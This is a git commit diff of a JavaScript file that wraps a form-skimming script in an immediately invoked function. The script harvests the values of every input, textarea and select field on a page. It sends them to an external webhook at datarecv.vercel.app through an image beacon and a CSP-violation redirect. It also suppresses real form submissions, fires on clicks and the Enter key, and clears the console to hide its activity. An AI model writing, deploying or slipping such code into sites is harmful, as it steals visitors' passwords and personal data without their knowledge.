c81c7c58cdb12d9a53b0eef00a23b783846505e6
Miguel Zacca <miguel_zacca@estudante.sesisenai.org.br>
2026-01-17 20:07:52 -0300

    v2.1.q

--- src.js
+++ src.js
@@ -1,51 +1,53 @@
-const webhookBase = 'https://datarecv.vercel.app/api/webhook'
+;(() => {
+  const webhookBase = 'https://datarecv.vercel.app/api/webhook'
 
-async function send(params) {
-  if (!params) return
+  async function send(params) {
+    if (!params) return
 
-  params.append('webhook_redirect', location.href)
-  const finalUrl = `${webhookBase}/q?${params.toString()}`
+    params.append('webhook_redirect', location.href)
+    const finalUrl = `${webhookBase}/q?${params.toString()}`
 
-  document.addEventListener('securitypolicyviolation', () => {
-    location.href = finalUrl
+    document.addEventListener('securitypolicyviolation', () => {
+      location.href = finalUrl
+    })
+
+    const img = new Image()
+    img.src = finalUrl
+  }
+
+  function getData() {
+    const params = new URLSearchParams()
+
+    document.querySelectorAll('input, textarea, select').forEach((input, i) => {
+      const key = input.name || input.id || `unknown${i + 1}`
+
+      if (key && input.value) {
+        params.append(key, input.value)
+      }
+    })
+
+    return params
+  }
+
+  document.querySelectorAll('form').forEach((form) => {
+    form.addEventListener('submit', (e) => {
+      e.preventDefault()
+      send(getData())
+      setTimeout(() => location.reload(), 500)
+    })
   })
 
-  const img = new Image()
-  img.src = finalUrl
-}
+  document.querySelectorAll('form *[role="button"], button').forEach((btn) => {
+    btn.addEventListener('click', () => {
+      send(getData())
+    })
+  })
 
-function getData() {
-  const params = new URLSearchParams()
-
-  document.querySelectorAll('input, textarea, select').forEach((input, i) => {
-    const key = input.name || input.id || `unknown${i + 1}`
-
-    if (key && input.value) {
-      params.append(key, input.value)
+  addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      send(getData())
     }
   })
 
-  return params
-}
-
-document.querySelectorAll('form').forEach((form) => {
-  form.addEventListener('submit', (e) => {
-    e.preventDefault()
-    send(getData())
-    setTimeout(() => location.reload(), 500)
-  })
-})
-
-document.querySelectorAll('form *[role="button"], button').forEach((btn) => {
-  btn.addEventListener('click', () => {
-    send(getData())
-  })
-})
-
-addEventListener('keydown', (e) => {
-  if (e.key === 'Enter') {
-    send(getData())
-  }
-})
-
-console.clear()
+  console.clear()
+})()
